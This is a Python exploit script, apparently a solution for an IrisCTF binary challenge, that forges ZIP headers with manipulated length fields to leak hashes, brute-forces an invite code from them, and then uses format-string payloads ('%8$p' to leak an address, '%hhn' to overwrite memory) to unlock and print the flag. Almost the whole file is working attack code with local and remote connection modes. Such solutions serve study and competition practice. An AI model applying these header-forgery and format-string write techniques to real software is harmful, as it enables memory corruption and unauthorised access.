#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep
from zipfile import ZipFile
from binascii import hexlify

exe = context.binary = ELF('./chal_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x1851
brva 0x17C8
brva 0x23B7
brva 0x240E
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def upload(id, file):
    sla(b'> ', b'4')
    sla(b'? ', str(id).encode())
    sla(b'file\n', hexlify(file))

def list_file(id=15):
    sla(b'> ', b'2')
    sla(b'? ', str(id).encode())

def create_user(code, name, pw):
    sla(b'> ', b'3')
    sla(b'? ', code)
    sla(b'? ', name)
    sla(b'? ', pw)

def view_file(id, pw, cid):
    sla(b'> ', b'5')
    sla(b'? ', str(id).encode())
    sla(b'? ', pw)
    sla(b'? ', str(cid).encode())

def view_flag(id, pw):
    sla(b'> ', b'6')
    sla(b'? ', str(id).encode())
    sla(b'? ', pw)

def do_hash(inp, leng=10):
    out = 0xCBF29CE484222325
    for i in range(leng):
        out = 0x100000001B3 * (inp[i] ^ out)
        out &= 0xffffffffffffffff
    return out


# ==================== EXPLOIT ====================
p = start()

with ZipFile('exploit.zip', 'w') as zf:
    with zf.open("A"*0x20, 'w') as f:
        f.write(b"B"*0xf)

contlen_offset = 0x12
namelen_offset = 0x12+0x8
contlen = 0xa

with open('./exploit.zip', 'rb') as f:
    inp = f.read()

namelen_base = 0x100000000 - 0x1E4 + (1 if args.REMOTE else 0)
stride = 5 + 512
prefix = inp[:contlen_offset] + p32(contlen) + inp[contlen_offset + 4 : namelen_offset]
suffix = inp[namelen_offset + 4 : 0x1FF]


for i in range(20):
    namelen = namelen_base - (i * stride)
    forged = prefix + p32(namelen) + suffix
    upload(15, forged)

list_file()
hashes = []
for i in range(20):
    ru(b'  10 ')
    hashes.append(int(ru(b'\n', drop=True), 16))

info("Hashes: {}".format(hashes))

invite_code = b''
wordbag = b'-abcdefghijklmnopqrstuvwxyz'
seed = b'PK\x01\x02\x3f\x00\x0a\x00\x00'
for index in range(20):
    target_hash = hashes[index]
    for candidate in wordbag:
        candidate_byte = bytes([candidate])
        window = (candidate_byte + invite_code + seed)[:10]
        if do_hash(window) == target_hash:
            # info("{} = {}".format(window, do_hash(window)))
            invite_code = candidate_byte + invite_code
            break
    else:
        raise RuntimeError(f"Unable to match invite character at position {index}")

info("Invite code: {}".format(invite_code))

if not args.REMOTE:
    invite_code = b'terrible-red-busses'

create_user(invite_code, b'mmb', b'bmg')

with ZipFile('exploit.zip', 'w') as zf:
    with zf.open("A"*0x20, 'w') as f:
        f.write(b'|%8$p|....')

with open('./exploit.zip', 'rb') as f:
    upload(0, f.read())

view_file(0, b'bmg', 0)
ru(b'|')
leak = int(ru(b'|', drop=True), 16)
slog('leak @ %#x', leak)


with ZipFile('exploit.zip', 'w') as zf:
    with zf.open("A"*0x20, 'w') as f:
        f.write(b'%c%16$hhnAAAAAAA'+p64(leak+0x10))

with open('./exploit.zip', 'rb') as f:
    upload(0, f.read())

view_file(0, b'bmg', 1)
view_flag(0, b'bmg')

interactive()
# irisctf{tom_needs_to_rethink_his_security}
